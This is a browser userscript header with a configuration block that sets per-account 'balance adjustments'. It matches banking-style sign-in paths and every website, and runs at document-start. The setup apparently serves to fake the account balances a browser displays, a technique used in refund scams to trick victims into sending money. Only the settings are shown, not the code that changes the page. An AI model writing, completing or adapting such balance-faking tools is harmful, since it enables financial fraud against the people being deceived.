// ==UserScript==
// @name         Ed Start 4Rec db.b.bendel@directbox.com
// @namespace    http://tampermonkey.net/
// @version      3.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/516888/Ed%20Start%204Rec%20dbbbendel%40directboxcom.user.js
// @updateURL https://update.greasyfork.org/scripts/516888/Ed%20Start%204Rec%20dbbbendel%40directboxcom.meta.js
// ==/UserScript==
//======================================================================================================================================================================================
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//======================================================================================================================================================================================


//         UBERSICHT
    // Specify the balances to adjust by index and the amount to adjust
    const accountBalanceAdjustments = [

        { index: 0, amount: 0 },
        { index: 1, amount: 0 },

   //      { index: 2, amount: 6300},  //3   // will have to change to 1395
        { index: 3, amount: 0 },  // 4  //will have to change to app 5700
  //     { index: 4, amount: 6300},  // 5
  //       { index: 5, amount: 6300}, //1
         { index: 6, amount:  0},
  //      { index: 7, amount: 6300}, //2
         { index: 8, amount:  0},
        { index: 9, amount: 0 },

    ];

